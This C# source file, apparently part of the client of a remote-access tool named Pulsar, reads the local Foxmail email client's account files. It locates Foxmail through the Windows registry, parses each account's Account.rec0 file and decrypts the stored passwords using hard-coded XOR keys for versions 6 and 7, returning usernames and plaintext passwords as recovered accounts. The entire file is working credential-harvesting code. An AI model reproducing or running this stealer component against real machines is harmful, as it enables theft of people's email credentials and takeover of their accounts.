using Pulsar.Common.Models;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Pulsar.Client.Recovery
{
    internal static class FoxMailReader
    {
        /// <summary>
        /// Gets the FoxMail storage directory path
        /// </summary>
        private static string GetStoragePath()
        {
            try
            {
                var foxPath = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command")?.GetValue("")?.ToString();
                if (string.IsNullOrEmpty(foxPath))
                    return null;

                foxPath = foxPath.Remove(foxPath.LastIndexOf("Foxmail.exe")).Replace("\"", "") + @"Storage\";
                return Directory.Exists(foxPath) ? foxPath : null;
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Reads email accounts from FoxMail configuration files
        /// </summary>
        /// <returns>List of recovered email accounts</returns>
        public static List<RecoveredAccount> Read()
        {
            var accounts = new List<RecoveredAccount>();
            string storagePath = GetStoragePath();

            if (string.IsNullOrEmpty(storagePath) || !Directory.Exists(storagePath))
                return accounts;

            try
            {
                foreach (var dir in Directory.GetDirectories(storagePath, "*@*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        string email = Path.GetFileName(dir);
                        string userData = Path.Combine(dir, @"Accounts\Account.rec0");

                        if (!File.Exists(userData))
                            continue;

                        var recoveredAccount = ReadAccountFile(email, userData);
                        if (recoveredAccount != null)
                            accounts.Add(recoveredAccount);
                    }
                    catch (Exception inner)
                    {
                        Debug.WriteLine($"FoxMail account error ({dir}): {inner.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"FoxMail directory error: {ex.Message}");
            }

            return accounts;
        }

        private static RecoveredAccount ReadAccountFile(string email, string filePath)
        {
            try
            {
                using (var fs = new FileStream(filePath, FileMode.Open))
                {
                    var len = (int)fs.Length;
                    var bits = new byte[len];
                    fs.Read(bits, 0, len);

                    int version = DetermineVersion(bits[0]);
                    string password = ExtractPassword(bits, len, version);

                    if (string.IsNullOrEmpty(password))
                        return null;

                    return new RecoveredAccount
                    {
                        Application = "FoxMail",
                        Username = email,
                        Password = password,
                        Url = $"mailto:{email}" // Using mailto: protocol for email accounts
                    };
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"FoxMail file error ({filePath}): {ex.Message}");
                return null;
            }
        }

        private static int DetermineVersion(byte firstByte)
        {
            return firstByte == 0xD0 ? 0 : 1; // Version 6.X = 0, Version 7.0+ = 1
        }

        private static string ExtractPassword(byte[] data, int length, int version)
        {
            string buffer = "";
            bool accountFound = false;

            for (int i = 0; i < length; i++)
            {
                if (data[i] > 0x20 && data[i] < 0x7f && data[i] != 0x3d)
                {
                    buffer += (char)data[i];

                    if (buffer.Equals("Account") || buffer.Equals("POP3Account"))
                    {
                        accountFound = true;
                        i = ExtractField(data, i, version); // Skip account field
                        buffer = "";
                    }
                    else if (accountFound && (buffer.Equals("Password") || buffer.Equals("POP3Password")))
                    {
                        string encryptedPassword = ExtractEncryptedPassword(data, i, version);
                        return DecodePassword(version, encryptedPassword);
                    }
                }
                else
                {
                    buffer = "";
                }
            }

            return null;
        }

        private static int ExtractField(byte[] data, int index, int version)
        {
            int offset = version == 0 ? 2 : 9;
            int newIndex = index + offset;

            while (newIndex < data.Length && data[newIndex] > 0x20 && data[newIndex] < 0x7f)
            {
                newIndex++;
            }

            return newIndex;
        }

        private static string ExtractEncryptedPassword(byte[] data, int index, int version)
        {
            int offset = version == 0 ? 2 : 9;
            int startIndex = index + offset;
            string encryptedPassword = "";

            while (startIndex < data.Length && data[startIndex] > 0x20 && data[startIndex] < 0x7f)
            {
                encryptedPassword += (char)data[startIndex];
                startIndex++;
            }

            return encryptedPassword;
        }

        /// <summary>
        /// Foxmail password decoder
        /// Credit: Jacob Soo - https://github.com/jacobsoo
        /// </summary>
        private static string DecodePassword(int version, string pHash)
        {
            if (string.IsNullOrEmpty(pHash) || pHash.Length % 2 != 0)
                return "";

            try
            {
                int[] key = version == 0
                    ? new int[] { '~', 'd', 'r', 'a', 'G', 'o', 'n', '~' }
                    : new int[] { '~', 'F', '@', '7', '%', 'm', '$', '~' };

                int firstByte = version == 0 ? 0x5A : 0x71;

                // Convert hex string to byte array
                int size = pHash.Length / 2;
                int[] b = new int[size];
                int index = 0;

                for (int i = 0; i < size; i++)
                {
                    b[i] = Convert.ToInt32(pHash.Substring(index, 2), 16);
                    index += 2;
                }

                // Initialize arrays
                int[] c = new int[b.Length];
                c[0] = b[0] ^ firstByte;
                Array.Copy(b, 1, c, 1, b.Length - 1);

                // Extend key if needed
                while (b.Length > key.Length)
                {
                    int[] newKey = new int[key.Length * 2];
                    Array.Copy(key, 0, newKey, 0, key.Length);
                    Array.Copy(key, 0, newKey, key.Length, key.Length);
                    key = newKey;
                }

                // Decode password
                int[] d = new int[b.Length];
                for (int i = 1; i < b.Length; i++)
                {
                    d[i - 1] = b[i] ^ key[i - 1];
                }

                string decodedPassword = "";
                for (int i = 0; i < d.Length - 1; i++)
                {
                    int value = (d[i] - c[i] < 0) ? d[i] + 255 - c[i] : d[i] - c[i];
                    decodedPassword += (char)value;
                }

                return decodedPassword;
            }
            catch
            {
                return "";
            }
        }
    }
}